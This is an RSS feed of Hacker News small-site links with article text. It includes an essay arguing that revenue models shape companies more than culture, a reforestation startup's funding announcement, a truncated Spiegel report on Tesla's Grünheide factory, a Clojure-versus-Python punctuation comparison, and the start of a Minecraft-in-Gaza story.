<p>Let’s take a dominant term view of this problem. When a company is first built, several variables dictate its decisions:</p>



<ul><li>The <em>implicit </em>values/culture of the early team. As Ben Horowitz would say, “what you do is who you are.”&nbsp;</li><li>The <em>explicit </em>values/culture of the early team. Are we user-centric? Data-driven? …</li><li>The revenue model.</li></ul>



<p>I think that over time, the revenue model is the dominant term. The limit of a product towards infinity, so to speak, is based on its revenue model. If your revenue model is ads, it doesn’t matter if your stated mission is “to organize the world’s knowledge and make it universally accessible and useful”, “to give people the power to build community and bring the world closer together”, or anything else. If your revenue model is ads, you are an ads company.</p>



<p>I’m not diminishing the role of culture and values. I think those are critical. Part of me would love to believe the hundreds of books written on how culture determines everything. But I don’t. At least not for companies that can hire some of the smartest people in the world, gather massive amounts of data, and build technology more sophisticated than ever. And be trying to “maximize shareholder value”.</p>



<p>I’ve actually agonized over whether culture or revenue are the dominant term. In fact, I agonized so much that I’ve had this article in my head for years, and in a Google Doc for months, but I couldn’t get myself to write it / publish it. Because part of me believes culture always wins. Actually, <em>all</em> of me <em>wants </em>to believe culture <em>always</em> wins. But I’ve had my idealism crushed enough times by hard realities.&nbsp;</p>



<p>Yes, having and espousing a positive culture and set of values are important. And they may shape how and how quickly the revenue model dominates (for example, companies like Enron or pre-IPO Uber show how bad things can get if you have a terrible culture). But regardless of your mission statement, your culture, your values, and so on, if you choose the wrong revenue model, it will dominate them in a shareholder-value-driven, capitalistic society. Culture can only dominate if it’s negative. A positive culture <em>is </em>necessary, but it’s not sufficient.</p>



<p><em>In other words, over the long term, a company (and its product) will morph to take the shape of its revenue streams.</em></p>



<h3>Charlie Munger Knew It</h3>



<p>Charlie Munger, Warren Buffet’s business partner, has a pretty famous speech where he talks about the power of incentives.</p>



<blockquote><p>“Well I think I’ve been in the top 5% of my age cohort all my life in understanding the power of incentives, and all my life I’ve underestimated it. And never a year passes, but I get some surprise that pushes my limit a little farther.” —<a href="https://fs.blog/2013/02/the-psychology-of-human-misjudgement/">Charlie Munger</a></p></blockquote>



<p>Charlie gives several examples: for instance, FedEx needed to move/sort their packages more quickly, so instead of paying employees per hour, they paid them per shift: productivity increased dramatically (employees now had less incentive to take longer hours to do the same amount of work). Charlie’s model of human behavior is pretty simple: we follow incentives. He makes people sound almost coin-operated.</p>



<p>Now, this isn’t entirely true—there are plenty of examples and research showing that our behavior is more complicated than simple incentives would predict. But Charlie is arguably one of the best investors in the world, and he’s onto something. Even though there might be other variables that influence our behavior, you can still simplify things down to incentives. Incentives are his dominant term.</p>



<p>That incentives are dominant is actually pretty obvious to a lot of people. Somehow in the tech industry, we seem to have just clouded our own judgement through some sense of moral superiority. We care about the impact we’re having on the world. We have noble missions that we rally around and try to hire people who are excited by them. So far, so good. But then we shoot ourselves in the foot by setting up business models with misaligned incentives.</p>



<h3>Look for Aligned Business Models</h3>



<p>So what does this mean in practice? Well, if you only care about making money, it doesn’t mean much. But if you do care about more than money, if you care about the impact your work has and you want to be proud of what you do, it’s worth thinking through this a little more deeply.</p>



<p>Whether you’re starting a company or joining one, look for a business model <em>without</em> perverse incentives. A business model that sets things up so that the better a product is, the better off the company is and its users are.</p>



<p>Sometimes, counterintuitively, a business model may seem aligned at first glance, but end up being quite harmful. The classic example that we’re all now aware of is free products. Free seems great at first glance. But companies have to make money somehow. So they sell ads, or data, or some mix of the two that their users don’t quite understand. And so now, success for the company means more time spent on the product (which may or may not be a good thing for users), less privacy (definitely not a good thing for users), and ultimately more ads.*</p>



<p>So often, paid is better than free*.  At <a href="https://www.monarchmoney.com/">Monarch Money</a>, my current startup, we’ve chosen to go with a paid model, with a hope that we’ll be more aligned in creating value for our users (who we can now call customers… notice how there’s a word for “customer service”, but no “user service”?). There will still be plenty of forks in the road where we can decide whether we help our customers, or take advantage of them, and I hope our values will help us navigate those forks, but at least the revenue model is in our favor.</p>



<p>Another layer to consider is whether your product and revenue model help people with just short-term goals, or a mix of both short and long-term goals. Products that are great and helpful, help their users with both. Good products might help with one or the other. The products with the most potential for damage provide some short-term benefit at the <em>expense</em> of longer-term goals.</p>



<p>So when you consider starting or joining a company, look at the business model, and do the “limit math”. Think about what things might look like if you become massively successful, because you might be.</p>



<hr>



<p><em>*This is an opinion piece. I had to draw a lot of simplifications to keep this article short. A lot of statements are definitely not universally true, but are true enough that they’re worth using as examples.</em></p>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->

				
</article><!-- #post-${ID} -->

	<nav role="navigation" aria-label="Posts">
		<h2>Post navigation</h2>
		
	</nav>
<!-- #comments -->

		</main><!-- #main -->
	</section><!-- #primary -->


	</div></div>]]>
            </description>
            <link>https://somehowmanage.com/2020/09/20/revenue-model-not-culture-is-the-dominant-term/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24543510</guid>
            <pubDate>Mon, 21 Sep 2020 13:58:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Do Musical Scales Have Certain Numbers of Notes?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24543266">thread link</a>) | @lucaspauker
<br/>
September 21, 2020 | https://www.lucaspauker.ml/articles/16 | <a href="https://web.archive.org/web/*/https://www.lucaspauker.ml/articles/16">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.lucaspauker.ml/articles/16</link>
            <guid isPermaLink="false">hacker-news-small-sites-24543266</guid>
            <pubDate>Mon, 21 Sep 2020 13:41:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[New management standards for remote teams – Mistakes to avoid]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24543136">thread link</a>) | @ThinkConfluent
<br/>
September 21, 2020 | https://www.thinkconfluent.com/article/5-common-mistakes-to-avoid-when-managing-a-remote-team-1594919537202x525963345500480200 | <a href="https://web.archive.org/web/*/https://www.thinkconfluent.com/article/5-common-mistakes-to-avoid-when-managing-a-remote-team-1594919537202x525963345500480200">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.thinkconfluent.com/article/5-common-mistakes-to-avoid-when-managing-a-remote-team-1594919537202x525963345500480200</link>
            <guid isPermaLink="false">hacker-news-small-sites-24543136</guid>
            <pubDate>Mon, 21 Sep 2020 13:30:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Drone-based automated reforestation and land rehabilitation]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24543091">thread link</a>) | @Osiris30
<br/>
September 21, 2020 | https://ecosummit.net/articles/dendra-raises-10m-series-a-led-by-airbus-ventures?mc_cid=d29b56deb6&mc_eid=c7c0ce2bec | <a href="https://web.archive.org/web/*/https://ecosummit.net/articles/dendra-raises-10m-series-a-led-by-airbus-ventures?mc_cid=d29b56deb6&mc_eid=c7c0ce2bec">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-33745">

			<div>
				<p>Today is a good day for our climate and planet. Smart ecosystem restoration plays a key role in our global effort to minimise climate change and accelerate the transformation to a low carbon economy. Therefore, it makes a lot of sense to automate ecosystem restoration by bringing together plant science, AI, drones and human creativity to decrease the costs and increase the accountability of biological carbon sequestration. Our <a href="https://ecosummit.net/articles/ecosummit-invests-in-clim8-dendra-systems-and-solar-for-schools">angel portfolio</a> company <a href="https://www.dendra.io/">Dendra Systems</a> raises $10M (€8.4M) Series A from <a href="https://airbusventures.vc/">Airbus Ventures</a>, <a href="https://www.atoneventures.com/">At One Ventures</a>, <a href="https://www.futurepositivecapital.com/">Future Positive Capital</a> and <a href="https://lowercarboncapital.com/">Lowercarbon Capital</a>. Nicole Conner (Airbus Ventures) and Tom Chi (At One Ventures) join the board to support CEO and Co-Founder <a href="https://www.linkedin.com/in/susangraham123/">Susan Graham</a> and her diverse team of ecologists and technologists in building a big startup with big impact.</p>
<p><img src="http://ecosummit.net/uploads/dendra_series_a_photo_620.jpg" alt="" width="620" height="349"></p>
<p>Oxford-based Dendra was founded in 2014 with the simple idea to plant trees with drones. It took the founders a while to find product-market fit by pivoting the smart green startup to paying customers, in Dendra’s case the mining industry in Australia. It turns out that natural resources companies exploiting metals, minerals, coal, oil and gas nowadays take sustainability very seriously and have adopted comprehensive sustainability strategies. They often hire service providers to help them restore and rehabilitate land that was degraded during mining operations. In fact, in most countries there are laws that demand ex-post ecosystem restoration. Driven by customers including <a href="https://www.bhp.com/">BHP</a>, <a href="https://www.glencore.com/">Glencore</a>, <a href="https://www.riotinto.com/">Rio Tinto</a> and <a href="https://www.yancoal.com.au/">Yancoal</a> Dendra developed an end-to-end solution including machine learning and aerial seeding for scalable ecosystem restoration and already carried out 38 projects in 11 countries. The new funds will be used to hire new talent, further develop the product and enter new markets and industries.</p>
<p><img src="http://ecosummit.net/uploads/dendra_drone_620.jpg" alt="" width="620" height="349"></p>
<p>Dendra’s patented technology captures high resolution data and applies ecology-trained artificial intelligence to map and assess degraded land. Leveraging this data, precise restoration plans for every site’s unique ecological conditions are created and executed. Utilising customised drones, Dendra is able to plant 120 seeds a minute per drone at scale — 150 times faster than traditional manual planting methods. Afterwards, Dendra continues to collect data and analyse plant growth to predict where future work will be needed, ensure full restoration and quantify carbon capture without the costs or risks of putting human workers into the field.</p>
<p><img src="http://ecosummit.net/uploads/dendra_ecologists_technologists_620.jpg" alt="" width="620" height="349"></p>
<p>We’re very happy and proud to be among Dendra’s smart green investors and believe that this startup is going to make a big difference for our future. Get in touch with Susan and her team if you want to invest in their next round to generate environmental, financial and strategic returns, work for Dendra to change the world yourself or become a customer to automate your sustainability. The time to act is now.</p>
<p><iframe width="620" height="349" src="https://www.youtube.com/embed/YqXL7tYOCWc" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>

								
				<p>Tags: <a href="https://ecosummit.net/articles/tag/ai" rel="tag">AI</a>, <a href="https://ecosummit.net/articles/tag/airbus-ventures" rel="tag">Airbus Ventures</a>, <a href="https://ecosummit.net/articles/tag/at-one-ventures" rel="tag">At One Ventures</a>, <a href="https://ecosummit.net/articles/tag/bhp" rel="tag">BHP</a>, <a href="https://ecosummit.net/articles/tag/dendra-systems" rel="tag">Dendra Systems</a>, <a href="https://ecosummit.net/articles/tag/drones" rel="tag">Drones</a>, <a href="https://ecosummit.net/articles/tag/ecosummit-angel-portfolio" rel="tag">Ecosummit Angel Portfolio</a>, <a href="https://ecosummit.net/articles/tag/ecosummit-berlin-2019" rel="tag">Ecosummit Berlin 2019</a>, <a href="https://ecosummit.net/articles/tag/ecosystem-restoration" rel="tag">Ecosystem Restoration</a>, <a href="https://ecosummit.net/articles/tag/future-positive-capital" rel="tag">Future Positive Capital</a>, <a href="https://ecosummit.net/articles/tag/glencore" rel="tag">Glencore</a>, <a href="https://ecosummit.net/articles/tag/lowercarbon-capital" rel="tag">Lowercarbon Capital</a>, <a href="https://ecosummit.net/articles/tag/plant-science" rel="tag">Plant Science</a>, <a href="https://ecosummit.net/articles/tag/rio-tinto" rel="tag">Rio Tinto</a>, <a href="https://ecosummit.net/articles/tag/series-a" rel="tag">Series A</a>, <a href="https://ecosummit.net/articles/tag/susan-graham" rel="tag">Susan Graham</a>, <a href="https://ecosummit.net/articles/tag/sustainability-automation" rel="tag">Sustainability Automation</a>, <a href="https://ecosummit.net/articles/tag/yancoal" rel="tag">Yancoal</a></p>

<br>				

			
			</div>
		</div></div>]]>
            </description>
            <link>https://ecosummit.net/articles/dendra-raises-10m-series-a-led-by-airbus-ventures?mc_cid=d29b56deb6&amp;mc_eid=c7c0ce2bec</link>
            <guid isPermaLink="false">hacker-news-small-sites-24543091</guid>
            <pubDate>Mon, 21 Sep 2020 13:26:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Elon Musk Shows the Germans How to Move Quickly]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24543038">thread link</a>) | @Tomte
<br/>
September 21, 2020 | https://www.spiegel.de/international/business/the-tesla-factory-near-berlin-elon-musk-shows-the-germans-how-to-move-quickly-a-a14a3415-a4ed-4d85-80c1-ec53b66ac0cb | <a href="https://web.archive.org/web/*/https://www.spiegel.de/international/business/the-tesla-factory-near-berlin-elon-musk-shows-the-germans-how-to-move-quickly-a-a14a3415-a4ed-4d85-80c1-ec53b66ac0cb">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-article-el="body">
<section data-app-hidden="true">


</section>
<section>
<div>
<figure data-component="Image" data-settings="{&quot;id&quot;:&quot;4f34f3e1-6c6f-4065-9ec6-3301690ac70f&quot;, &quot;zoomable&quot;:true,&quot;zoomId&quot;:&quot;af6df857-089e-48b7-a801-1e4641be4189&quot;}">
<p><span>
<span data-image-el="aspect">
<span>
<img data-image-el="img" src="https://cdn.prod.www.spiegel.de/images/4f34f3e1-6c6f-4065-9ec6-3301690ac70f_w948_r1.77_fpx76_fpy24.jpg" srcset="https://cdn.prod.www.spiegel.de/images/4f34f3e1-6c6f-4065-9ec6-3301690ac70f_w520_r1.77_fpx76_fpy24.jpg 520w, https://cdn.prod.www.spiegel.de/images/4f34f3e1-6c6f-4065-9ec6-3301690ac70f_w948_r1.77_fpx76_fpy24.jpg 948w" width="948" height="536" sizes="948px" title="Tesla founder Elon Musk: &quot;A ton of fun!&quot;" alt="Tesla founder Elon Musk: &quot;A ton of fun!&quot;">
</span>
</span>
</span>

</p>
<figcaption>
<p><strong>Tesla founder Elon Musk:</strong> "A ton of fun!"</p>
<span>
Foto: <p>Julian Stähle / dpa</p>
</span>
</figcaption>
</figure>
</div><div>
<p>A large property map hangs in the mayor's office, right next to a display cabinet full of memorabilia accumulated over a long term in office. The coat of arms of the town of Grünheide on the map has faded, as has the writing: "Net settlement area of 300 hectares," it reads, if you look hard enough.</p>


<div>
<p>Arne Christiani's predecessor hung up the poster 20 years ago, back when BMW wanted to build a car manufacturing plant on the site, but then chose the city of Leipzig instead. "When I was first elected mayor in 2003, I left the map up," says Christiani. The pine forest on the edge of the town has remained his field of dreams for almost 17 years.</p><p>During that time, Grünheide has grown steadily, but its population has also aged. It's a place that's beautiful for people who appreciate peace and quiet, but not one that’s particularly tempting for the younger generation. Each year, Christiani has apologized to locals on International Volunteer Day for the fact that it had once again not been possible to attract high-quality industrial jobs to the area.</p>
</div>

<div>
<p>For some time now, though, two new maps have been hanging above the old one, with the parcel of land colored red. Christiani's dream could finally be coming true, with Tesla hoping to build electric cars on the site.</p><h3><strong>Dreams Threatened, Dreams Come True</strong></h3><p>If you leave Town Hall and walk a good 800 meters through a pine forest to the edge of the village, you reach a lake called Peetzsee. Christiani had been in office for two years when Johannes Curth and his family came to fulfil their dream here, swapping a rental apartment in Berlin’s Prenzlauer Berg neighborhood for a home of their own, surrounded by forests and lakes.</p>
</div>

<p>The Curths bought a plot of land just a few meters from the shore of the lake back when prices were still reasonable. They built a house with large windows and surrounded by a good-sized yard, in which stand two magnificent old trees in it.</p>

<section data-area="contentbox">
<div>
<figure data-component="Image" data-settings="{&quot;id&quot;:&quot;996d8f55-bef6-471b-ad10-5c788bf27a9e&quot;, &quot;zoomable&quot;:false,&quot;zoomId&quot;:&quot;0cf2fccb-e994-4e14-8017-76b51258d75e&quot;}">
<span>
<span data-image-el="aspect">
<span>

<img data-image-el="img" src="https://cdn.prod.www.spiegel.de/images/996d8f55-bef6-471b-ad10-5c788bf27a9e_w568_r0.7571817357121258_fpx50.98_fpy47.69.jpg" srcset="https://cdn.prod.www.spiegel.de/images/996d8f55-bef6-471b-ad10-5c788bf27a9e_w284_r0.7571817357121258_fpx50.98_fpy47.69.jpg 284w, https://cdn.prod.www.spiegel.de/images/996d8f55-bef6-471b-ad10-5c788bf27a9e_w335_r0.7571817357121258_fpx50.98_fpy47.69.jpg 335w, https://cdn.prod.www.spiegel.de/images/996d8f55-bef6-471b-ad10-5c788bf27a9e_w568_r0.7571817357121258_fpx50.98_fpy47.69.jpg 568w" width="568" height="750" sizes="568px" loading="lazy" data-srcset="https://cdn.prod.www.spiegel.de/images/996d8f55-bef6-471b-ad10-5c788bf27a9e_w284_r0.7571817357121258_fpx50.98_fpy47.69.jpg 284w, https://cdn.prod.www.spiegel.de/images/996d8f55-bef6-471b-ad10-5c788bf27a9e_w335_r0.7571817357121258_fpx50.98_fpy47.69.jpg 335w, https://cdn.prod.www.spiegel.de/images/996d8f55-bef6-471b-ad10-5c788bf27a9e_w568_r0.7571817357121258_fpx50.98_fpy47.69.jpg 568w">
</span>
</span>
</span>
</figure>

</div>
</section>
<p>But now that Mayor Christiani's dream is coming true, Curth sees his own dream threatened. "We moved here because of the peace and quiet and the nature," he says. "What will happen if Tesla starts building cars here?" He fears for the quality of the water and air. And he worries about the extra traffic and what will happen to this sleepy community of 8,755 people when Tesla moves in.</p>

<div>
<p>Elon Musk, the entrepreneur behind the carmaker, is an uncompromising man whose ideas jump back and forth between California, Mars and Grünheide. The head of the world's largest electric car manufacturer builds rockets that ferry people into space and dreams of building a hyperloop tunnel for passenger transport. He is adored by his followers because, as an entrepreneur, he refuses to accept any limits.</p><h3><strong>Breathtaking Speed</strong></h3><p>Almost as a byproduct, Musk is now also changing not only the provincial state of Brandenburg, where he’s setting up his factory, but also Germany. The project just outside of Berlin is becoming symbolic for industrial policy in times of climate change. Whereas German companies tend to moan and dig in their heels when the government sets overly ambitious climate targets, as they did last week when the new European Union climate goals were announced, Tesla brings both together: sustainable manufacturing and speed. Breathtaking speed.</p>
</div>
<figure>
<div data-component="Image" data-settings="{&quot;id&quot;:&quot;7bfd7c90-7763-4bb3-ad45-ab17ec97c569&quot;, &quot;zoomable&quot;:true,&quot;zoomId&quot;:&quot;8ce47ff1-cec4-4406-a086-12611119bc3f&quot;}">
<div>
<div>
<p><span>
<span data-image-el="aspect">
<span>

<img data-image-el="img" src="https://cdn.prod.www.spiegel.de/images/7bfd7c90-7763-4bb3-ad45-ab17ec97c569_w718_r1.5_fpx33.34_fpy50.jpg" srcset="https://cdn.prod.www.spiegel.de/images/7bfd7c90-7763-4bb3-ad45-ab17ec97c569_w488_r1.5_fpx33.34_fpy50.jpg 488w, https://cdn.prod.www.spiegel.de/images/7bfd7c90-7763-4bb3-ad45-ab17ec97c569_w616_r1.5_fpx33.34_fpy50.jpg 616w, https://cdn.prod.www.spiegel.de/images/7bfd7c90-7763-4bb3-ad45-ab17ec97c569_w718_r1.5_fpx33.34_fpy50.jpg 718w" width="718" height="479" sizes="718px" loading="lazy" data-srcset="https://cdn.prod.www.spiegel.de/images/7bfd7c90-7763-4bb3-ad45-ab17ec97c569_w488_r1.5_fpx33.34_fpy50.jpg 488w, https://cdn.prod.www.spiegel.de/images/7bfd7c90-7763-4bb3-ad45-ab17ec97c569_w616_r1.5_fpx33.34_fpy50.jpg 616w, https://cdn.prod.www.spiegel.de/images/7bfd7c90-7763-4bb3-ad45-ab17ec97c569_w718_r1.5_fpx33.34_fpy50.jpg 718w" title="Tesla Gigafactory in Grünheide: Are the Germans fast enough?" alt="Tesla Gigafactory in Grünheide: Are the Germans fast enough?">
</span>
</span>
</span>
</p><figcaption>
<p><strong>Tesla Gigafactory in Grünheide:</strong> Are the Germans fast enough?</p>
<span>
Foto: Robert Grahn&nbsp;/ euroluftbild.de / ullstein bild
</span>
</figcaption>
</div>
</div>
</div>
</figure><div>
<p>Musk's Gigafactory will be built in a region where most structures tend to be single-family homes, if there are any at all. In the first stage of development, 12,000 people will work around the clock in three shifts. Once the factory is complete, more than 40,000 people could produce a good 2 million Tesla vehicles here. "Please work at Tesla Giga Berlin! It's going to be a ton of fun," Musk recently tweeted in German.</p><p>For quite some time, German car executives and politicians tended to make fun of Musk, notorious as he was for his outrageous personality on Twitter. When he outlined his visions at a 2014 lunch with Peter Altmaier - who was chief of staff of Angela Merkel's Chancellery at the time but is now economics minister – and raved about the advantages of electric propulsion, saying it could be used in all means of transportation except for rockets flying into space, Altmaier still thought he sounded a bit unhinged. "At the time," says Altmaier, "nobody thought this technology would be so successful." At least the German competition didn't.</p><p>As recently as 2018, when the California-based company was having troubles with the serial production of its Model 3, Volkswagen considered becoming a strategic investor in Tesla to teach Musk how to do mass production. But reality has long since overtaken that idea: Tesla is now worth five times as much as Volkswagen on the stock exchange.</p><p>The days when the billionaire had to ask politicians for an appointment are over. When he came to Germany in early September to visit his construction site, the reception he received was that of a pop star. Fans shared the latest movement data of his private jet and puzzled where he might pop up next. Leading politicians cleared their calendars at short notice.</p><p>This week, the Musk party is set to continue, and his name will once again appear in newspapers around the world. He has slated this Tuesday as "Battery Day,” when he plans to announce the progress Tesla has made in battery technology in addition to identifying the site of at least one new battery plant. There are many indications, including interviews with Musk, that Grünheide may be chosen as the site. If it is, giant tree-felling machines would again show up to wait for authorization to clear another 60 hectares (nearly 150 acres) of forest.</p><p>It would send an unmistakable message. Because one day later, on Wednesday, hearings are set to begin in the nearby town of Erkner on the 406 complaints against the factory that have been filed by environmental associations and residents. Construction, though, has already been underway for months, with Tesla deciding to move ahead at its own risk with preliminary permits.</p><h3><strong>Faster and Better</strong></h3><p>A recent visit to the construction site in Grünheide provided a glimpse of the degree to which Tesla's mantra has been internalized at Tesla, a mantra by which speed counts most. Evan Horetsky, who heads the roughly 100-member Tesla team in Grünheide, showed a number of interested journalists around the construction site.</p><p>The slim man in his mid-30s with a shaved head and carefully trimmed beard is one of the troubleshooters on Musk's team. He helped out with the Tesla factory in California before going to Reno, Nevada, to lead the creation of the company's first Gigafactory. That had hardly been finished by the time construction in Shanghai began. He says that he and his people have gotten "faster and better" each time. Now, Horetsky is moving things along in Brandenburg.</p><p>Just last fall, the site was covered with tall pine trees. Now, though, they have been replaced by dozens of white concrete pillars protruding from the levelled ground. In the rear section, the shell of the paint shop has been erected. "We gained experience during the construction of the first buildings that we could directly apply in the further development of the design," the American says. "It enabled us to save a couple of days."</p>
</div>
<figure>
<div data-component="Image" data-settings="{&quot;id&quot;:&quot;557ddc99-4b15-46b4-871e-c4391a0edffd&quot;, &quot;zoomable&quot;:true,&quot;zoomId&quot;:&quot;88a027e2-3c5d-434e-8f54-d44bd210bc46&quot;}">
<div>
<div>
<p><span>
<span data-image-el="aspect">
<span>

<img data-image-el="img" src="https://cdn.prod.www.spiegel.de/images/557ddc99-4b15-46b4-871e-c4391a0edffd_w718_r1.4951856946354882_fpx40.02_fpy49.94.jpg" srcset="https://cdn.prod.www.spiegel.de/images/557ddc99-4b15-46b4-871e-c4391a0edffd_w488_r1.4951856946354882_fpx40.02_fpy49.94.jpg 488w, https://cdn.prod.www.spiegel.de/images/557ddc99-4b15-46b4-871e-c4391a0edffd_w616_r1.4951856946354882_fpx40.02_fpy49.94.jpg 616w, https://cdn.prod.www.spiegel.de/images/557ddc99-4b15-46b4-871e-c4391a0edffd_w718_r1.4951856946354882_fpx40.02_fpy49.94.jpg 718w" width="718" height="480" sizes="718px" loading="lazy" data-srcset="https://cdn.prod.www.spiegel.de/images/557ddc99-4b15-46b4-871e-c4391a0edffd_w488_r1.4951856946354882_fpx40.02_fpy49.94.jpg 488w, https://cdn.prod.www.spiegel.de/images/557ddc99-4b15-46b4-871e-c4391a0edffd_w616_r1.4951856946354882_fpx40.02_fpy49.94.jpg 616w, https://cdn.prod.www.spiegel.de/images/557ddc99-4b15-46b4-871e-c4391a0edffd_w718_r1.4951856946354882_fpx40.02_fpy49.94.jpg 718w" title="Mayor Arne Christiani: A field of dreams." alt="Mayor Arne Christiani: A field of dreams.">
</span>
</span>
</span>
</p><figcaption>
<p><strong>Mayor Arne Christiani: </strong>A field of dreams.</p>
<span>
Foto: HC Plambeck / DER SPIEGEL
</span>
</figcaption>
</div>
</div>
</div>
</figure><div>
<p>The fact that final permission to build the factory has not yet been granted and that skeptical citizens must first be heard doesn't bother Horetsky. He says he takes their fears seriously. He notes that similarly complicated requirements had to be fulfilled when building the factory in Shanghai. "The difference to Germany is that here, the people who are directly affected can have their say," says Horetsky. "And who has more of a right to air their views than they do?"</p><p>It is, essentially, the concrete realization of what had been an abstract discussion. What price is society prepared to pay for the future? And are Germans capable of keeping up with the necessary pace?</p><p>The Gigafactory is set to be built in record time, with the first Y model electric SUVs slated for shipping as early as summer 2021. Plans call for 500,000 electric cars to be produced annually by the end of the first construction stage, a pace the <em>Wall Street Journal</em> has described as "breakneck."</p><p>And all this is taking place in Germany, a country where the length of approval procedures has almost doubled in the last 10 years. And in the state of Brandenburg, where construction of the Berlin-Brandenburg Airport (BER) has been marred by endless construction problems and is finally set to open its doors, fully nine years behind schedule.</p><h3><strong>Not Even Corona Has Slowed the Project</strong></h3><p>It sounded almost like a joke initially: An American high-tech car company with a volatile boss meets German environmental law, citizen participation and German bureaucracy. Now, though, it looks as though electric cars could start rolling off the assembly line in Grünheide even faster than they did in centrally steered China. And not even the coronavirus has thus far managed to slow down the project.</p><p>Somehow, the clichés didn't hold true. Tesla may be a tenacious, demanding company, but it also takes criticism seriously and tries to address it. In contrast to German companies, Musk uses every possibility that planning law avails him to accelerate construction, but he does so at his own risk. At the same time, the Brandenburg government has shown itself to be a skilful negotiator in the fight for the project. Since the contract was awarded, a task force of employees from the participating authorities has met weekly with Tesla representatives to discuss progress on the project.</p><p>Axel Vogel was one of the founding members of the Green Party in 1980. He worked in the party's …</p></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.spiegel.de/international/business/the-tesla-factory-near-berlin-elon-musk-shows-the-germans-how-to-move-quickly-a-a14a3415-a4ed-4d85-80c1-ec53b66ac0cb">https://www.spiegel.de/international/business/the-tesla-factory-near-berlin-elon-musk-shows-the-germans-how-to-move-quickly-a-a14a3415-a4ed-4d85-80c1-ec53b66ac0cb</a></em></p>]]>
            </description>
            <link>https://www.spiegel.de/international/business/the-tesla-factory-near-berlin-elon-musk-shows-the-germans-how-to-move-quickly-a-a14a3415-a4ed-4d85-80c1-ec53b66ac0cb</link>
            <guid isPermaLink="false">hacker-news-small-sites-24543038</guid>
            <pubDate>Mon, 21 Sep 2020 13:23:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Deep Learning in Clojure with Fewer Parentheses Than Keras and Python]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24542974">thread link</a>) | @dragandj
<br/>
September 21, 2020 | https://dragan.rocks/articles/20/Deep-Diamond-Deep-Learning-in-Clojure-Fewer-Parentheses-Python-Keras | <a href="https://web.archive.org/web/*/https://dragan.rocks/articles/20/Deep-Diamond-Deep-Learning-in-Clojure-Fewer-Parentheses-Python-Keras">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="text-org5455e07">
<p>
How about the number of dreaded parentheses, <code>(</code> and <code>)</code>?
</p>

<table>


<colgroup>
<col>

<col>

<col>
</colgroup>
<thead>
<tr>
<th scope="col">&nbsp;</th>
<th scope="col">Python</th>
<th scope="col">Clojure</th>
</tr>
</thead>
<tbody>
<tr>
<td>( and )</td>
<td>48</td>
<td>28</td>
</tr>

<tr>
<td>(, ), [, and ]</td>
<td>50</td>
<td>48</td>
</tr>

<tr>
<td>Grouped (())</td>
<td>8</td>
<td>2</td>
</tr>

<tr>
<td>)))</td>
<td>2</td>
<td>1</td>
</tr>

<tr>
<td>,</td>
<td>17</td>
<td>0</td>
</tr>

<tr>
<td>model.add</td>
<td>8</td>
<td>0</td>
</tr>
</tbody>
</table>

<p>
As we can see from the table, on every punctuation metric that I could think
of, Deep Diamond and Clojure fare better than Keras &amp; Python.
</p>

<p>
Keras uses almost twice as much parentheses than Deep Diamond. Clojure uses <code>[]</code>
for vector literals, which Deep Diamond uses as tensor shapes. You will note that
there are more than a few of these, and argue that these are parentheses, too.
Fine. Add them up, and Clojure fares slightly better than Python!
</p>

<p>
A parenthesis here and there is not a problem, but there are horror tales of
<code>(((((((</code> and <code>)))))))</code> in Lisps. Not in Clojure. See that there is not a
single <code>((</code> in the Clojure example, and only two occurances of <code>))</code>.
In Python - there are 8.
</p>

<p>
Then we come to all additional assorted punctuation in Python: commas, dots, etc.
In Clojure, there are none, while in Python there are dozens.
</p>

<p>
Python is also riddled with redundant stuff such as <code>model.add()</code>.
</p>

<p>
Etc., etc. You get my point.
</p>
</div></div>]]>
            </description>
            <link>https://dragan.rocks/articles/20/Deep-Diamond-Deep-Learning-in-Clojure-Fewer-Parentheses-Python-Keras</link>
            <guid isPermaLink="false">hacker-news-small-sites-24542974</guid>
            <pubDate>Mon, 21 Sep 2020 13:18:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Designed in Minecraft, Built IRL]]>
            </title>
            <description>
<![CDATA[
Score 62 | Comments 8 (<a href="https://news.ycombinator.com/item?id=24542830">thread link</a>) | @donohoe
<br/>
September 21, 2020 | https://restofworld.org/2020/rebuilding-gaza-with-minecraft/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2020/rebuilding-gaza-with-minecraft/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p>Most Sundays, Somia Hamdan visits her local park with her two friends, Amal and Laima. They sit on a picnic bench opposite one another and chat neurotically about Twitter and local gossip. Hamdan is there to socialize but also to supervise. “Since I created the space,” Hamdan said, “I like to take care of it.”</p>



